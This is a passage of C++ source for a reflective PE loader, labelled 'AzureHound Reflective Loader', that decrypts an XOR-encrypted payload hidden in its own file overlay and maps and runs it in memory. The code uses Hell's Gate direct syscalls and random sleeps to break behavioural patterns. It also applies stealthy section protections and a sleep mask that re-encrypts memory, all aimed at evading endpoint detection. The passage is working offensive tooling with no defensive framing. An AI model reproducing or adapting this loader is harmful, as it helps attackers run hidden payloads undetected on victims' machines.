    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    return (void*)(base + nt->OptionalHeader.AddressOfEntryPoint);
}

// ----------------------------------------------------------------------------
// XOR decryption + decompression
// ----------------------------------------------------------------------------
static std::vector<uint8_t> xorDecrypt(const uint8_t* data, size_t len,
                                        const uint8_t key[32]) {
    DbgPrint("[*] XOR decrypting: %zu bytes\n", len);
    std::vector<uint8_t> result(len);
    for (size_t i = 0; i < len; i++)
        result[i] = data[i] ^ key[i % 32];
    DbgPrint("[+] XOR complete: %zu bytes\n", result.size());
    return result;
}

// ----------------------------------------------------------------------------
// Main entry
// ----------------------------------------------------------------------------
extern "C" int main(int argc, char* argv[]) {
    DbgPrint("================================================================\n");
    DbgPrint(" AzureHound Reflective Loader - Hell's Gate + Thread Pool\n");
    DbgPrint("================================================================\n");

    // Init syscalls (Hell's Gate)
    if (!InitSyscalls()) {
        DbgPrint("[!] Hell's Gate failed, falling back to Win32 APIs\n");
        pNtAlloc = nullptr;
	pNtProt  = nullptr;
	pNtWrite = nullptr;
    }

    // Load blob from PE overlay (appended past last section)
    DbgPrint("[*] Reading overlay...\n");
    char exePath[MAX_PATH];
    if (!GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
        DbgPrint("[!] GetModuleFileNameA failed\n");
        return 1;
    }
    DbgPrint("[*] Exe path: %s\n", exePath);

    HANDLE hSelf = CreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hSelf == INVALID_HANDLE_VALUE) {
        DbgPrint("[!] CreateFileA on self failed (err=%lu)\n", GetLastError());
        return 1;
    }

    DWORD fileSize = GetFileSize(hSelf, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        DbgPrint("[!] GetFileSize failed\n");
        CloseHandle(hSelf);
        return 1;
    }
    DbgPrint("[*] File size: %lu bytes\n", fileSize);

    // Read the 8-byte overlay trailer from EOF
    DWORD trailer[2];  // [overlay_size, magic]
    SetFilePointer(hSelf, -8, NULL, FILE_END);
    DWORD readBytes = 0;
    if (!ReadFile(hSelf, trailer, sizeof(trailer), &readBytes, NULL) || readBytes != 8) {
        DbgPrint("[!] Failed to read overlay trailer\n");
        CloseHandle(hSelf);
        return 1;
    }

    static const uint32_t OVERLAY_MAGIC = 0x4E455245; // "EREN" LE
    uint32_t overlaySize = trailer[0];
    uint32_t magic      = trailer[1];
    DbgPrint("[*] Overlay: size=%lu, magic=0x%08X\n", overlaySize, magic);

    if (magic != OVERLAY_MAGIC) {
        DbgPrint("[!] Overlay magic mismatch (expected 0x%08X, got 0x%08X)\n",
                 OVERLAY_MAGIC, magic);
        CloseHandle(hSelf);
        return 1;
    }

    if (overlaySize < sizeof(BlobHeader) + 8 || overlaySize > fileSize) {
        DbgPrint("[!] Invalid overlay size: %lu\n", overlaySize);
        CloseHandle(hSelf);
        return 1;
    }

    // Read the entire overlay (AHBL header + encrypted data, excluding the trailer we already read)
    DWORD blobReadSize = overlaySize - 8;
    std::vector<uint8_t> blobBuf(blobReadSize);
    SetFilePointer(hSelf, -(LONG)overlaySize, NULL, FILE_END);
    if (!ReadFile(hSelf, blobBuf.data(), blobReadSize, &readBytes, NULL) ||
        readBytes != blobReadSize) {
        DbgPrint("[!] Failed to read overlay data\n");
        CloseHandle(hSelf);
        return 1;
    }
    CloseHandle(hSelf);

    const uint8_t* actualBlob = blobBuf.data();
    DbgPrint("[+] Overlay loaded, blob size: %lu bytes\n", blobReadSize);

    // Parse header
    BlobHeader hdr;
    memcpy(&hdr, actualBlob, sizeof(hdr));
    if (memcmp(hdr.magic, "AHBL", 4) != 0 || hdr.version != BLOB_VERSION) {
        DbgPrint("[!] Invalid blob header (magic=%.4s, version=%d)\n", hdr.magic, hdr.version);
        return 1;
    }
    DbgPrint("[+] Blob header valid (version %d)\n", hdr.version);

    // Read payload size (4 bytes after header) — rest is low-entropy padding
    uint32_t payloadSize = 0;
    memcpy(&payloadSize, actualBlob + sizeof(hdr), 4);
    const uint8_t* enc = actualBlob + sizeof(hdr) + 4;
    size_t encLen = payloadSize;
    DbgPrint("[*] Payload size: %u, encrypted: %zu bytes\n", payloadSize, encLen);

    if (encLen > blobReadSize - sizeof(hdr) - 4) {
        DbgPrint("[!] Invalid payload size in overlay\n");
        return 1;
    }

    // Key – must match BlobPrep
    static const uint8_t key[32] = {
        0x41, 0x7A, 0x75, 0x72, 0x65, 0x48, 0x6F, 0x75,
        0x6E, 0x64, 0x4C, 0x6F, 0x61, 0x64, 0x65, 0x72,
        0x53, 0x65, 0x63, 0x72, 0x65, 0x74, 0x4B, 0x65,
        0x79, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37
    };

    // XOR decrypt (no decompression — raw payload)
    std::vector<uint8_t> payload;
    try {
        payload = xorDecrypt(enc, encLen, key);
    } catch (const std::exception& e) {
        DbgPrint("[!] Decryption error: %s\n", e.what());
        return 1;
    } catch (...) {
        DbgPrint("[!] Decryption unknown error\n");
        return 1;
    }

    // Map PE
    DbgPrint("[*] Mapping PE...\n");
    if (!MapPE(payload.data(), payload.size())) {
        DbgPrint("[!] MapPE failed\n");
        return 1;
    }

    // Random delay to break behavioral pattern
    srand(GetTickCount());
    Sleep(rand() % 5000 + 1000);

    // Apply relocations
    DbgPrint("[*] Applying relocations...\n");
    if (!ApplyRelocations()) {
        DbgPrint("[!] ApplyRelocations failed\n");
        return 1;
    }

    Sleep(rand() % 3000 + 500);

    // Resolve imports
    DbgPrint("[*] Resolving imports...\n");
    if (!ResolveImports()) {
        DbgPrint("[!] ResolveImports failed\n");
        return 1;
    }

    Sleep(rand() % 2000 + 500);

    // TLS
    DbgPrint("[*] Initializing TLS...\n");
    if (!InitTLS()) {
        DbgPrint("[!] InitTLS failed\n");
        return 1;
    }

    Sleep(rand() % 1000 + 500);

    // Apply per-section permissions (stealthy)
    if (!ApplySectionProtections()) {
        DbgPrint("[!] ApplySectionProtections failed\n");
        return 1;
    }

    // ---- Sleep Mask ----
    SleepMaskInit();
    SleepMaskStart();

    DbgPrint("[*] All preparations done, launching payload...\n");

    // Direct entry point call (VEH decrypts on first touch, timer re-encrypts)
    void* ep = GetEntryPoint();
    if (!ep) {
        DbgPrint("[!] Entry point is NULL\n");
        return 1;
    }
    DbgPrint("[*] Calling entry point at %p\n", ep);
    ((int(*)())ep)();

    SleepMaskStop();
    DbgPrint("[+] Loader completed successfully\n");
    return 0;
}
